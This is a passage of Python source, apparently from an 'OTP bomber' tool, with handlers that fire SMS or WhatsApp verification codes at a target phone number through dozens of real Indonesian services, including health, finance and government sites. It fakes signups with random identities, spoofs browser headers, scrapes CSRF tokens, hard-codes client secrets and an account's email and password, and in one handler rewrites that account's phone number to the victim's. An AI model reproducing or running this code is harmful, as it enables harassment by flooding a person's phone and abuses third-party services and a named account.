        resp = requests.post("https://api.tokoplas.com/v2/register/otp/request", headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 50: TOPLUSMS ====================
def send_toplusms_otp(phone_input):
    p = normalize(phone_input)
    phone_62 = p['fmt_62']
    name  = ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize()
    email = name.lower() + str(random.randint(100, 999)) + "@gmail.com"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://toplusms.app",
        "referer": "https://toplusms.app/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": get_random_user_agent(),
    }
    payload = {"name": name, "email": email, "phone": phone_62,
               "password": "Pass@" + ''.join(random.choices(string.digits, k=4)),
               "otp_channel": "whatsapp"}
    try:
        resp = requests.post("https://api.toplusms.app/register/verify-phone",
                             headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 51: VIDIO ====================
def send_vidio_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://www.vidio.com",
        "referer": "https://www.vidio.com/users/sign_in",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phone": phone_08}
    try:
        resp = requests.post("https://api.vidio.com/otp/send", headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 52: KPOIN ====================
def send_kpoin_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://kpoin.com",
        "referer": "https://kpoin.com/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phone": phone_08}
    try:
        resp = requests.post("https://app.kpoin.com/api/bff/v1/notification/sendotp", headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 74: NUSASMS ====================
def _rng_str(n):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _rng_pass():
    return (
        random.choice(string.ascii_uppercase)
        + random.choice(string.ascii_lowercase)
        + random.choice(string.digits)
        + random.choice("!@#$%^&*")
        + _rng_str(6)
    )

def send_nusa_otp(phone_input):
    p        = normalize(phone_input)
    phone_08 = p['fmt_08']
    user_id  = _rng_str(12)
    password = _rng_pass()
    email    = _rng_str(8) + "@gmail.com"

    sess = requests.Session()
    try:
        sess.get(
            "https://app.nusasms.com/freetrial",
            headers={"User-Agent": get_random_user_agent()},
            timeout=10, verify=False,
        )
    except Exception:
        pass

    base_hdrs = {
        "Host":               "app.nusasms.com",
        "Connection":         "keep-alive",
        "sec-ch-ua":          '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
        "sec-ch-ua-mobile":   "?0",
        "sec-ch-ua-platform": '"Windows"',
        "User-Agent":         get_random_user_agent(),
        "Accept":             "application/json, text/javascript, */*; q=0.01",
        "Content-Type":       "application/x-www-form-urlencoded; charset=UTF-8",
        "X-Requested-With":   "XMLHttpRequest",
        "Origin":             "https://app.nusasms.com",
        "Sec-Fetch-Site":     "same-origin",
        "Sec-Fetch-Mode":     "cors",
        "Sec-Fetch-Dest":     "empty",
        "Referer":            "https://app.nusasms.com/freetrial",
        "Accept-Encoding":    "gzip, deflate, br, zstd",
        "Accept-Language":    "id,en-US;q=0.9,en;q=0.8",
    }

    # Step 1: verify → dapat signupToken
    verify_form = {
        "userId":      user_id,
        "password":    password,
        "rePassword":  password,
        "email":       email,
        "serviceType": "masking",
        "phoneNumber": phone_08,
    }
    r = None
    try:
        r = sess.post(
            "https://app.nusasms.com/processSignup?action=verify",
            headers=base_hdrs, data=verify_form, timeout=15, verify=False,
        )
        verify_resp = r.json() if r.text else {}
    except Exception as e:
        return None, str(e)

    if "signupToken" not in verify_resp:
        return (r.status_code if r else None), str(verify_resp)

    # Step 2: sendotp — kirim verify response + otpType
    otp_form = {**verify_resp, "otpType": "wa"}
    try:
        resp = sess.post(
            "https://app.nusasms.com/processSignup?action=sendotp",
            headers=base_hdrs, data=otp_form, timeout=15, verify=False,
        )
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 54: BERPRESTASI ====================
def send_berprestasi_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    name  = ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize()
    email = name.lower() + str(random.randint(100, 999)) + "@gmail.com"
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://berprestasi.id",
        "referer": "https://berprestasi.id/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": get_random_user_agent(),
    }
    payload = {"name": name, "email": email, "phone": phone_08, "via": "whatsapp"}
    try:
        resp = requests.post("https://berprestasi.id/api/otp/send", headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 55: BISATOPUP ====================
def send_bisatopup_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://bisatopup.co.id",
        "referer": "https://bisatopup.co.id/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phone_number": phone_08, "type": "register", "channel": "whatsapp"}
    try:
        resp = requests.post("https://bisatopup.co.id/api/auth/register/send-otp", headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 56: STOCKBIT ====================
def send_stockbit_otp(phone_input):
    p = normalize(phone_input)
    phone_62 = p['fmt_62']
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://stockbit.com",
        "referer": "https://stockbit.com/register",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phoneNumber": phone_62, "cancelledRequestId": "", "type": "SMS"}
    try:
        resp = requests.post("https://exodus.stockbit.com/registration/v4/otp/phone/send", headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 58: REDBUS ====================
def send_redbus_otp(phone_input):
    p = normalize(phone_input)
    bare = p['bare']
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "origin": "https://www.redbus.id",
        "referer": "https://www.redbus.id/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
        "user-agent": get_random_user_agent(),
    }
    p2 = normalize(phone_input)
    phone_62 = p2['fmt_62']
    try:
        resp = requests.get(
            f"https://m.redbus.id/api/getOtp?number={phone_62}&cc=62&whatsAppOpted=True",
            headers=headers, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 59: BUCCHERI ====================
def send_buccheri_otp(phone_input):
    p = normalize(phone_input)
    bare = p['bare']
    sess = requests.Session()
    LOGIN_URL  = "https://member.buccheri.com/login"
    OTP_URL    = "https://member.buccheri.com/api/v1/otp-sent"
    try:
        r = sess.get(LOGIN_URL, headers={"User-Agent": get_random_user_agent()}, timeout=10, verify=False)
        csrf = sess.cookies.get("XSRF-TOKEN", "")
        csrf = urllib.parse.unquote(csrf) if csrf else ""
        if not csrf:
            m = re.search(r'<meta[^>]+name="csrf-token"[^>]+content="([^"]+)"', r.text)
            csrf = m.group(1) if m else ""
    except Exception:
        csrf = ""
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://member.buccheri.com",
        "referer": LOGIN_URL,
        "x-xsrf-token": csrf,
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phone": bare, "channel": "whatsapp"}
    try:
        resp = sess.post(OTP_URL, headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 60: GABINO ====================
def send_gabino_otp(phone_input):
    p = normalize(phone_input)
    bare = p['bare']
    sess = requests.Session()
    LOGIN_URL = "https://member.gabino.id/login"
    OTP_URL   = "https://member.gabino.id/api/v1/otp-sent"
    try:
        r = sess.get(LOGIN_URL, headers={"User-Agent": get_random_user_agent()}, timeout=10, verify=False)
        csrf = sess.cookies.get("XSRF-TOKEN", "")
        csrf = urllib.parse.unquote(csrf) if csrf else ""
        if not csrf:
            m = re.search(r'<meta[^>]+name="csrf-token"[^>]+content="([^"]+)"', r.text)
            csrf = m.group(1) if m else ""
    except Exception:
        csrf = ""
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://member.gabino.id",
        "referer": LOGIN_URL,
        "x-xsrf-token": csrf,
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phone": bare, "channel": "whatsapp"}
    try:
        resp = sess.post(OTP_URL, headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 61: MOLADIN ====================
def send_moladin_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    sess = requests.Session()
    BASE_URL = "https://moladin.com"
    ua = get_random_user_agent()
    nonce = ""
    try:
        r = sess.get(BASE_URL, headers={"User-Agent": ua}, timeout=12, verify=False)
        # wp nonce ada di inline JS: "nonce":"xxxxxxxxxx"
        m = re.search(r'"nonce"\s*:\s*"([a-f0-9]{10})"', r.text)
        if m:
            nonce = m.group(1)
        if not nonce:
            # fallback: cari rest_nonce
            m2 = re.search(r'rest_nonce["\s:]+([a-f0-9]{10})', r.text)
            if m2:
                nonce = m2.group(1)
    except Exception:
        pass
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": BASE_URL, "referer": f"{BASE_URL}/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": ua,
        "x-wp-nonce": nonce,
    }
    payload = {"phone": phone_08}
    try:
        resp = sess.post(f"{BASE_URL}/wp-json/api/v1/request_otp",
                         headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 62: ADIRAKU ====================
def send_adiraku_otp(phone_input):
    p = normalize(phone_input)
    phone_62 = p['fmt_62']
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://adiraku.co.id",
        "referer": "https://adiraku.co.id/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-site",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phone": phone_62}
    try:
        resp = requests.post("https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata",
                             headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 63: TRI (3) ====================
def send_tri_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    headers = {
        "accept": "application/json",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://registrasi.tri.co.id",
        "referer": "https://registrasi.tri.co.id/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": get_random_user_agent(),
    }
    payload = {"mobile_number": phone_08}
    try:
        resp = requests.post("https://registrasi.tri.co.id/api/v1/generate-otp",
                             headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 64: BMSECURE SOFIA ====================
def send_bmsecure_sofia_otp(phone_input):
    p = normalize(phone_input)
    bare = p['bare']
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://sofia.bmsecure.id",
        "referer": "https://sofia.bmsecure.id/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phone": bare, "countryCode": "62", "otpType": "REGISTER", "channel": "WA"}
    try:
        resp = requests.post("https://sofia.bmsecure.id/central-api/sc-api/otp/generate",
                             headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 65: ALODOKTER ====================
def send_alodokter_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://www.alodokter.com",
        "referer": "https://www.alodokter.com/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": get_random_user_agent(),
    }
    payload = {"phone": phone_08}
    try:
        resp = requests.post("https://www.alodokter.com/generate-otp",
                             headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 66: ALOMEDIKA ====================
def send_alomedika_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    name  = ''.join(random.choices(string.ascii_lowercase, k=6)).capitalize()
    email = name.lower() + str(random.randint(100, 999)) + "@gmail.com"
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://www.alomedika.com",
        "referer": "https://www.alomedika.com/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": get_random_user_agent(),
    }
    payload = {"name": name, "email": email, "phone": phone_08,
               "profession": "dokter", "channel": "whatsapp"}
    try:
        resp = requests.post("https://www.alomedika.com/get_otp",
                             headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 67: BPJS KETENAGAKERJAAN ====================
def send_bpjs_otp(phone_input):
    p = normalize(phone_input)
    bare = p['bare']
    headers = {
        "accept": "application/json, text/plain, */*",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "id,en-US;q=0.9,en;q=0.8",
        "content-type": "application/json",
        "origin": "https://www.bpjsketenagakerjaan.go.id",
        "referer": "https://www.bpjsketenagakerjaan.go.id/",
        "sec-ch-ua": '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
        "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin",
        "user-agent": get_random_user_agent(),
    }
    p2 = normalize(phone_input)
    payload = {"phone": p2['fmt_08']}
    try:
        resp = requests.post("https://www.bpjsketenagakerjaan.go.id/bpu/otp",
                             headers=headers, json=payload, timeout=15, verify=False)
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 68: HALODOC ====================
def send_halodoc_otp(phone_input):
    # Flow: configs → challenge → validate → GET otp (rotate XSRF) → POST otp
    import os as _os, uuid as _uuid
    p = normalize(phone_input)
    phone_plus = p['fmt_plus']
    BASE_URL     = "https://www.halodoc.com"
    CLIENT_TOKEN = "5aef147b2eb6d7b2a8057752cd05f5a511c65a63039b8708c28241e11779af0e"
    CLIENT_ID    = "aeb680fb9b7907ec7f7caa60eb2bde3d"
    DEVICE_ID    = str(_uuid.uuid4())
    UA           = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/156.0.0.0 Safari/537.36"

    sess = requests.Session()

    def _gen_tp():
        return f"00-{_os.urandom(16).hex()}-{_os.urandom(8).hex()}-01"

    def _get_xsrf():
        return requests.utils.unquote(sess.cookies.get("XSRF-TOKEN", ""))

    def _base_h(xsrf=""):
        h = {
            "accept":             "application/json, text/plain, */*",
            "accept-encoding":    "gzip, deflate, br, zstd",
            "accept-language":    "id,en-US;q=0.9,en;q=0.8",
            "priority":           "u=1, i",
            "referer":            f"{BASE_URL}/",
            "sec-ch-ua":          '"Not:A-Brand";v="8", "Chromium";v="156", "Google Chrome";v="156"',
            "sec-ch-ua-mobile":   "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest":     "empty",
            "sec-fetch-mode":     "cors",
            "sec-fetch-site":     "same-origin",
            "traceparent":        _gen_tp(),
            "user-agent":         UA,
        }
        if xsrf:
            h["x-xsrf-token"] = xsrf
        return h

    try:
        # Step 1: configs → seed XSRF
        sess.get(f"{BASE_URL}/magneto-api/v1/auth/configs",
                 headers=_base_h(), timeout=12, verify=False)
        xsrf = _get_xsrf()

        # Step 2: challenge
        sess.put(f"{BASE_URL}/magneto-api/v1/users/passkey/authenticate/challenge",
                 headers={**_base_h(xsrf), "content-type": "application/json"},
                 json={"device_id": DEVICE_ID}, timeout=12, verify=False)
        xsrf = _get_xsrf()

        # Step 3: validate
        sess.get(f"{BASE_URL}/magneto-api/v1/users/passkey/{phone_plus}/validate",
                 headers=_base_h(xsrf), timeout=12, verify=False)
        xsrf = _get_xsrf()

        # Step 4: GET otp → rotate XSRF via response header
        r = sess.get(f"{BASE_URL}/magneto-api/v2/users/authentication/otp/requests",
                     headers=_base_h(xsrf),
                     params={"clientToken": CLIENT_TOKEN},
                     timeout=12, verify=False)
        xsrf_new = (r.headers.get("X-Xsrf-Token") or
                    r.headers.get("x-xsrf-token") or
                    _get_xsrf())

        # Step 5: POST otp
        resp = sess.post(
            f"{BASE_URL}/magneto-api/v2/users/authentication/otp/requests",
            headers={**_base_h(xsrf_new), "content-type": "application/json"},
            json={"phone_number": phone_plus, "channel": "whatsapp",
                  "otp_resent": False, "clientId": CLIENT_ID},
            timeout=15, verify=False,
        )
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 71: EASYCASH ====================
def send_easycash_otp(phone_input):
    import time as _time
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    BASE_URL = "https://loan.easycash.id"
    FALLBACK_TOKEN = "webFakeToken-536b8339161c4ad195b169bf71c2efb5"
    sess = requests.Session()
    device_token = FALLBACK_TOKEN
    try:
        r0 = sess.get(
            f"{BASE_URL}/register-login",
            headers={"User-Agent": get_random_user_agent()},
            timeout=10, verify=False,
        )
        token = sess.cookies.get("deviceToken", "")
        if token:
            device_token = token
    except Exception:
        pass

    static_cookies = {
        "sajssdk_2015_cross_new_user": "1",
        "_fbp":             "fb.1.1726404364208.304406689168566354",
        "_tt_enable_cookie": "1",
        "_ttp":             "jyUZUOglVrrmkdG37oUf2jq1eVS",
        "_ga":              "GA1.1.512112514.1726404367",
        "_gcl_au":          "1.1.552118675.1726404367",
        "_ttd_sync":        "1",
    }
    merged = {**static_cookies, **dict(sess.cookies)}
    merged["deviceToken"] = device_token
    cookie_str = "; ".join(f"{k}={v}" for k, v in merged.items())

    headers = {
        "Host":                        "loan.easycash.id",
        "platformtype":                "WEB",
        "User-Agent":                  get_random_user_agent(),
        "yqg-platform-device-token":   device_token,
        "Accept":                      "application/json, text/plain, */*",
        "build":                       "35313",
        "yqg-platform-sdk-type":       "IDN_YQD",
        "yqg-platform-language":       "id",
        "Content-Type":                "application/json",
        "blackbox":                    "oWPIc1726404367ES4sE5ow0G2",
        "Origin":                      BASE_URL,
        "Sec-Fetch-Site":              "same-origin",
        "Sec-Fetch-Mode":              "cors",
        "Sec-Fetch-Dest":              "empty",
        "Referer":                     f"{BASE_URL}/register-login",
        "Accept-Encoding":             "gzip, deflate, br, zstd",
        "Accept-Language":             "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
        "Cookie":                      cookie_str,
    }
    payload = {
        "mobileNumber":        phone_08,
        "notifType":           "WHATSAPP",
        "verificationPurpose": "REGISTER_OR_LOGIN",
    }
    try:
        resp = sess.post(
            f"{BASE_URL}/api/mobile/sendVerificationWithoutCaptcha",
            headers=headers, json=payload, timeout=15, verify=False,
        )
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 72: KREDITPINTAR ====================
def send_kreditpintar_otp(phone_input):
    p = normalize(phone_input)
    phone_08 = p['fmt_08']
    BASE_URL = "https://go.kreditpintar.com"
    sess = requests.Session()
    try:
        sess.get(
            f"{BASE_URL}/daftar",
            headers={"User-Agent": get_random_user_agent()},
            timeout=10, verify=False,
        )
    except Exception:
        pass
    headers = {
        "Host":               "go.kreditpintar.com",
        "Connection":         "keep-alive",
        "sec-ch-ua-platform": '"Android"',
        "User-Agent":         get_random_user_agent(),
        "Accept":             "application/json, text/plain, */*",
        "sec-ch-ua":          '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        "Content-Type":       "application/json",
        "sec-ch-ua-mobile":   "?1",
        "Origin":             BASE_URL,
        "Sec-Fetch-Site":     "same-origin",
        "Sec-Fetch-Mode":     "cors",
        "Sec-Fetch-Dest":     "empty",
        "Referer":            f"{BASE_URL}/daftar",
        "Accept-Encoding":    "gzip, deflate, br, zstd",
        "Accept-Language":    "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
    }
    payload = {"mobileNumber": phone_08}
    try:
        resp = sess.post(
            f"{BASE_URL}/api/auth/send-code",
            headers=headers, json=payload, timeout=15, verify=False,
        )
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)

# ==================== HANDLER 73: SKILLACADEMY ====================
_SA_EMAIL  = "azbantara@gmail.com"
_SA_PASSWD = "4i_juLyPPgQ2396"
_SA_GW     = "https://gw.ruangguru.com"
_SA_ORIGIN = "https://skillacademy.com"
_SA_UA     = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36"

def _sa_hdrs_gw(token=""):
    h = {
        "accept":             "application/json",
        "accept-encoding":    "gzip, deflate, br, zstd",
        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
        "content-type":       "application/json",
        "country":            "id",
        "disable-node-proxy": "true",
        "origin":             _SA_ORIGIN,
        "referer":            "https://skillacademy.com/",
        "sec-ch-ua":          '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
        "sec-ch-ua-mobile":   "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "cross-site",
        "tenantname":         "skillacademy",
        "user-agent":         _SA_UA,
        "with-auth":          "true",
    }
    if token:
        h["authorization"] = token if token.startswith("eyJ") else f"Bearer {token}"
    return h

def _sa_hdrs_sa():
    return {
        "accept":             "application/json",
        "accept-encoding":    "gzip, deflate, br, zstd",
        "accept-language":    "id,en-US;q=0.9,en;q=0.8",
        "connection":         "keep-alive",
        "content-type":       "application/json",
        "country":            "id",
        "disable-node-proxy": "false",
        "host":               "skillacademy.com",
        "origin":             _SA_ORIGIN,
        "referer":            "https://skillacademy.com/auth/login?redirectTo=/",
        "sec-ch-ua":          '"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"',
        "sec-ch-ua-mobile":   "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest":     "empty",
        "sec-fetch-mode":     "cors",
        "sec-fetch-site":     "same-origin",
        "tenantname":         "skillacademy",
        "user-agent":         _SA_UA,
        "with-auth":          "false",
    }

def send_skillacademy_otp(phone_input):
    p      = normalize(phone_input)
    target = p['bare']
    sess   = requests.Session()

    # Step 1: login
    token = ""
    try:
        r = sess.post(
            "https://skillacademy.com/api/auth/custom-login",
            headers=_sa_hdrs_sa(),
            json={"username": _SA_EMAIL, "password": _SA_PASSWD, "type": "default"},
            timeout=15, verify=False,
        )
        if r.status_code == 200:
            data  = r.json() if r.text else {}
            inner = data.get("data", {})
            if isinstance(inner, list): inner = inner[0] if inner else {}
            if isinstance(inner, dict):
                lr    = inner.get("login_response") or {}
                token = (lr.get("accessToken") or lr.get("token") or
                         inner.get("accessToken") or inner.get("token") or "")
            if not token:
                token = r.headers.get("authorization", "").replace("Bearer ", "")
    except Exception as e:
        return None, str(e)

    if not token:
        return None, "login failed"

    # Step 2: update phone ke target
    for method, url in [
        ("PUT",   f"{_SA_GW}/skillacademy/user"),
        ("PATCH", f"{_SA_GW}/skillacademy/user"),
    ]:
        for payload in [{"phoneNumber": target}, {"phone": target}]:
            try:
                fn = sess.put if method == "PUT" else sess.patch
                fn(url, headers=_sa_hdrs_gw(token=token), json=payload, timeout=10, verify=False)
            except Exception:
                pass

    # Step 3: send OTP
    try:
        resp = sess.post(
            f"{_SA_GW}/skillacademy/user/phone-number/send-otp",
            headers=_sa_hdrs_gw(token=token),
            json={"type": "OTPTypeWhatsApp"},
            timeout=15, verify=False,
        )
        return resp.status_code, resp.text
    except Exception as e:
        return None, str(e)
